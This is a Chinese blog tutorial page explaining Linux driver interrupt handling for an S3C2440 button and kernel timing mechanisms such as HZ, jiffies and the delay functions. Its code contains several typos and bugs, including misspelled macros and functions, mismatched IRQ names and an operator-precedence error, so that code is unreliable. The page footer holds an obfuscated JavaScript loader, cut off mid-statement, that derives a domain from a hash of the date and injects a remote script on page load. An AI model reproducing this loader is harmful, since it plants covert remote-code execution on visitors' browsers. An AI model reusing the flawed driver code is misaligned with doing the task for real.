<ul><li>当模块加载时，会调用初始化函数<code>s3c2440_buttons_init()</code>。在该函数中会进一步调用<code>request_irq()</code>函数来注册中断。<code>request_irq()</code>函数会操作内核中的一个中断描述符数组结构<code>irq_desc</code>。该数组结构比较复杂，主要的功能就是记录中断号对应的中断处理函数。</li><li>当中断到来时，会到中断描述符数组中询问中断号对应的中断处理函数，然后执行该函数。在本实例中，该函数的函数名是<code>isr_button</code>。</li><li>卸载模块是，会调用退出函数<code>s3c2440_buttons_exit()</code>。在该函数中，会调用<code>free_irq()</code>释放设备所使用的中断号。<code>free_irq()</code>函数也会操作中断描述符数组结构<code>irq_desc</code>，将该设备所对应的中断处理函数删除。</li></ul> 
<h3><a id="s3c2440_buttons_init_133"></a>初始化函数s3c2440_buttons_init()</h3> 
<p>初始化函数<code>s3c2440_buttons_init()</code>主要负责模块的初始化工作。模块初始化主要包括设置中断触发方式，注册中断号等。该函数的具体代码如下：</p> 
<pre><code class="prism language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">s3c2440_buttons_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> ret<span class="token punctuation">;</span>   <span class="token comment">//存储返回值</span>
	<span class="token function">set_irq_type</span><span class="token punctuation">(</span>K1_IRQ1<span class="token punctuation">,</span> IRQ_TYPE_EDGE_FAILLING<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//设置按键k为下降沿触发中断</span>
	
	<span class="token comment">/*注册中断处理函数*/</span>
	ret <span class="token operator">=</span> <span class="token function">request_irq</span><span class="token punctuation">(</span>K1_IRQ1<span class="token punctuation">,</span> isr_button<span class="token punctuation">,</span> SA_INTERRUPT<span class="token punctuation">,</span> DEVICE_NAME<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"K1_IRQ: could not register interrupt\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> ret<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token function">printk</span><span class="token punctuation">(</span>DEVICE_NAME<span class="token string">"initialized\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>接下来逐行分析s3c2440_buttons_init()函数</p> 
<ul><li>4行，使用<code>set_irq_type()</code>设置中断触发条件。<code>set_irq_type()</code>函数的原型如下：</li></ul> 
<pre><code class="prism language-c"><span class="token keyword">int</span> <span class="token function">set_irq_type</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> irq<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> type<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>参数<code>irq</code>表示中断号，参数type用来定义该中断的触发类型。中断触发类型有低电平触发、高电平触发、下降沿触发、上升沿触发、上升沿和下降沿联合触发。这里定义的中断类型为<code>IRQ_TYPE_EDGE_FALLING</code>，表示该外部中断为下降沿触发。中断触发类型定义在<code>&lt;include/linux/irq.h&gt;</code>中。</p> 
<pre><code class="prism language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IRQ_TYPE_NONE</span>      <span class="token expression"><span class="token number">0x00000000</span>  </span><span class="token comment">/*未定义中断类型*/</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IRQ_TYPE_EDGE_RISING</span> <span class="token expression"><span class="token number">0x00000001</span> </span><span class="token comment">/*上升沿中断类型*/</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IRQ_TYPE_EDGE_FALLING</span> <span class="token expression"><span class="token number">0x00000002</span> </span><span class="token comment">/*下降沿中断类型*/</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IRQ_TYPE_EDGE_BOTH</span> <span class="token expression"><span class="token punctuation">(</span>IRQ_TYPE_EDGE_FALLING <span class="token operator">|</span> IRQ_TYPE_EDGE_RISING  <span class="token punctuation">)</span> </span></span>
										<span class="token comment">/*上升沿和下降沿联合触发类型*/</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IRQ_TYPE_LEVEL_HIGH</span> <span class="token expression"><span class="token number">0x00000004</span> </span><span class="token comment">/*高电平触发类型*/</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IRQ_TYPE_LEVEL_LOW</span>  <span class="token expression"><span class="token number">0x00000008</span> </span><span class="token comment">/*低电平触发类型*/</span></span>
</code></pre> 
<ul><li> <p>6行，用来为按键K1申请中断。参数K1_IRQ1是要申请的中断号。参数<code>isr_button</code>是中断回调函数，该回调函数由按键1触发。触发条件被设置为下降沿触发。下降沿触发就是在两个连续的时钟周期内，中断控制器检测到端口的相应引脚，第一个周期为高电平，第二个周期为低电平。如下图所示。<br> <img src="https://images2.imgbox.com/27/c5/xnJ4lZal_o.png" alt="在这里插入图片描述"></p> </li><li> <p>7~11行，当申请中断出错时，打印出错信息和返回。<code>printk()</code>函数用法与<code>printf()</code>函数的用法相同，只是前者用于驱动程序中，后者用于用户程序中。</p> </li></ul> 
<h3><a id="isr_button_171"></a>中断处理函数isr_button()</h3> 
<p>当按键按下时，中断被触发，就会触发中断处理函数。该函数主要的功能是判断按键K1是否被按下。<br> 中断处理函数由<code>isr_button()</code>函数实现。该函数的参数由系统调用该函数时传递过来。参数<code>irq</code>表示被触发的中断号。参数<code>dev_id</code>是为共享中断线而设立的，因为按键驱动不使用共享中断，所以这里传进来的是NULL值。参数<code>regs</code>是一个寄存器组的结构体指针。寄存器组保存了处理器进入中断代码之前处理器的上下文。这些信息一般只在调试时使用，其他时候很少使用。所以对于一般的驱动程序来说，该参数通常是没有用的。</p> 
<pre><code class="prism language-c"><span class="token keyword">static</span> <span class="token class-name">irqreturn_t</span> <span class="token function">isr_button</span><span class="token punctuation">(</span><span class="token keyword">int</span> irq<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>dev_id<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">pt_regs</span> <span class="token operator">*</span>regs<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> GPGDAT<span class="token punctuation">;</span>
	GPGDAT<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token function">ioremap</span><span class="token punctuation">(</span><span class="token number">0x56000064</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/*映射内核地址*/</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>irq <span class="token operator">==</span> K1_IRQ1<span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">volatile</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>GPGDAT<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token comment">//是否K1仍然被按下</span>
		<span class="token punctuation">{<!-- --></span>
			<span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"K1 is pressed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<ul><li>3行定义了一个长整型变量GPGDAT，用来存储内核地址。只有内核地址才能被驱动程序访问，内核地址的相关概念，会在后面讲述。</li><li>4行使用<code>ioremap</code>将一个开发板上的物理端口地址转换为内核地址。<code>ioremap</code>在内核中的实现如下：</li></ul> 
<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">ioremap</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> phys_addr<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> size<span class="token punctuation">)</span>
</code></pre> 
<p>该函数的参数<code>phys_addr</code>表示要映射的起始的I/O端口地址。参数<code>size</code>表示要映射的空间大小。从上面GPGDAT寄存器表可知，大小属于32位寄存器。所以，它的参数分别是0x56000064和4字节。</p> 
<ul><li>5行判断信号是否是按下按键1发送过来的中断信号。</li><li>7~10行，当按键K1被按下时将在终端或日志文件中打印“K1 is pressed”信息。7行表示当GPGDAT寄存器的第0位为0（低电平时），按键K1按下。</li></ul> 
<h3><a id="s3c2440_buttons_exit_200"></a>退出函数s3c2440_buttons_exit()</h3> 
<p>当模块不再使用时，需要退出模块。按键的退出模块由<code>s3c2440_buttons_exit()</code>函数实现，其主要功能是释放中断线。</p> 
<pre><code class="prism language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">s3c2440_buttons_exit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token function">free_irq</span><span class="token punctuation">(</span>K1_IRQ<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/*释放中断线*/</span>
	<span class="token function">printk</span><span class="token punctuation">(</span>DEVICE_NAME <span class="token string">"exit\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<ul><li>3行，释放按键K1所申请的中断线。</li><li>4行，打印调试信息。</li></ul> 
<h2><a id="_213"></a>时钟机制</h2> 
<p>Linux驱动程序中经常会使用一些时钟机制，主要是用来延时一段时间。在这段时间中硬件设备可以完成相应的工作。本节将对Linux的时钟机制做一个简要的介绍。</p> 
<h3><a id="_215"></a>时间度量</h3> 
<p>Linux内核中一个重要的全局变量是<code>HZ</code>，这个变量表示与时钟中断相关的一个值。时钟中断是由系统定时硬件以周期性的间隔产生，这个周期性的值由HZ来表示。根据不同的硬件平台，HZ的取值是不一样的。这个值一般被定义为1000，如下代码所示。</p> 
<pre><code class="prism language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">HZ</span>  <span class="token expression"><span class="token number">1000</span></span></span>
</code></pre> 
<p>这里HZ的意思是每一秒钟中断发生1000次。每当时钟中断发生时，内核内部计数器的值就会加上1。内部计数器由<code>jiffies</code>变量来表示，当系统初始化时，这个变量被设置为0。每一个时钟到来，这个计数器的值加1，也就说这个变量记录了系统引导以来经历的时间。<br> 比较<code>jiffies</code>变量的值可以使用下面的几个宏来实现，这几个宏的原型如下：</p> 
<pre><code class="prism language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">time_after</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>     </span><span class="token punctuation">\</span>
	<span class="token expression"><span class="token punctuation">(</span><span class="token function">typecheck</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token punctuation">,</span> a<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> </span><span class="token punctuation">\</span>
	<span class="token expression"><span class="token function">typecheck</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> </span><span class="token punctuation">\</span>
	<span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">time_before</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>   <span class="token function">time_after</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>a<span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">time_after_eq</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>  </span><span class="token punctuation">\</span>
	<span class="token expression"><span class="token punctuation">(</span><span class="token function">typecheck</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token punctuation">,</span> a<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> </span><span class="token punctuation">\</span>
	<span class="token expression"><span class="token function">typecheck</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> </span><span class="token punctuation">\</span>
	<span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">time_before_eq</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>  <span class="token function">time_after_eq</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>a<span class="token punctuation">)</span></span></span>
</code></pre> 
<p>第1行的<code>time_after</code>宏，只是简单比较a和b的大小，如果a&gt;b则返回true。第5行的<code>time_before</code>宏通过<code>time_after</code>宏来实现。第6行的<code>time_after_eq</code>宏用来比较a和b的大小及相等的情况，如果<code>a&gt;=b</code>则返回true。第10行的<code>time_before_eq</code>宏通过<code>time_after_eq</code>宏来实现。</p> 
<h3><a id="_235"></a>时间延时</h3> 
<p>在C语言中，经常使用<code>sleep()</code>函数将程序延时一段时间，这个函数能够实现毫秒级的延时。在设备驱动程序中，很对对设备的操作也需要延时一段时间，使设备完成某些特定的任务。在Linux内核中，延时技术有很多种，这里也只讲解重要的两种。<br> <code>1.短时延时</code><br> 当设备驱动程序需要等待硬件处理的完成时，会主动地延时一段时间。这个时间一般是几十毫秒，甚至更短的时间。例如，驱动程序向设备的某个寄存器写入数据时，由于寄存器的写入数据较慢，所以需要驱动程序等待一定的时间，然后继续执行下面的工作。<br> Linux内核提供了3个函数来完成纳秒、微秒和毫秒级的延时，这3个函数的原型如下：</p> 
<pre><code class="prism language-c"><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">ndelay</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> x<span class="token punctuation">)</span>
<span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">udelay</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> usecs<span class="token punctuation">)</span>
<span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">msllep</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> msecs<span class="token punctuation">)</span>
</code></pre> 
<p>这些函数的实现与具体的平台有关，有的平台根本不能实现纳秒级的等待。这种情况下，只能根据CPU频率信息计算执行一条代码的时间，然后通过一个忙等待来软件模拟这种软件模拟类似下面的代码：</p> 
<pre><code class="prism language-c"><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">ndelay</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> x<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token comment">/*由x计算出count的值*/</span>
	<span class="token keyword">while</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		count<span class="token operator">--</span><span class="token punctuation">;</span> <span class="token comment">/*忙等待*/</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>除了使用<code>msleep()</code>函数实现毫秒级的延时，另外还有一些函数也用来实现毫秒级的延时。这种函数会使等待的进程睡眠而不是忙等待，函数的原型如下：</p> 
<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token function">msleeep</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> msecs<span class="token punctuation">)</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token function">msleep_interruptible</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> msecs<span class="token punctuation">)</span>
<span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">ssleep</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> seconds<span class="token punctuation">)</span>
</code></pre> 
<p>这3个函数不会忙等待，而是将等待的进程放入等待队列中，当延时的时间到达时，唤醒等待队列中的进程。其中<code>msleep()、ssleep()</code>函数不能被打断，而<code>msleep_interruptible()</code>函数可以被打断。<br> <code>2.长时延时</code><br> 长时延时表示驱动程序要延时一段相对较长的时间。实现这种延时，一般是比较当前<code>jiffies</code>和目标<code>jiffies</code>的值。长延时可以使用忙等待来实现，下面的代码给出了驱动程序延时3秒中的案例:</p> 
<pre><code class="prism language-c"><span class="token keyword">unsigned</span> <span class="token keyword">long</span> timeout <span class="token operator">=</span> jiffies <span class="token operator">+</span> <span class="token number">3</span><span class="token operator">*</span>Hz<span class="token punctuation">;</span>
<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">time_before</span><span class="token punctuation">(</span>jiffies<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p><code>time_before</code>宏简单地比较两个时间的大小，如果参数1的值小于参数2的值，则返回true。</p> 
<h2><a id="_270"></a>小结</h2> 
<p>大多数设备以中断方式来驱动代码的执行。例如本章讲解的按键驱动程序，当用户按下键盘时，才会触发先前注册的中断处理程序。这种机制具有很多的优点，可以节约很多CPU时间。除了中断之外，本章还简要介绍了时钟机制，硬件工作的速度一般较慢，在操作硬件的某些寄存器，一般需要内核延时一段时间，在短时间时可以使用忙等待机制，但是对于长时间延时则对号使用等待延时机制。</p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/d2b7f56f1b601c6c5598324439f5a183/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Ubuntu 22.04 配置 QGIS二次开发环境</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/4125935cd4945bf6378955a42f41ef8a/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Linux保留最近30天文件的shell脚本</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var 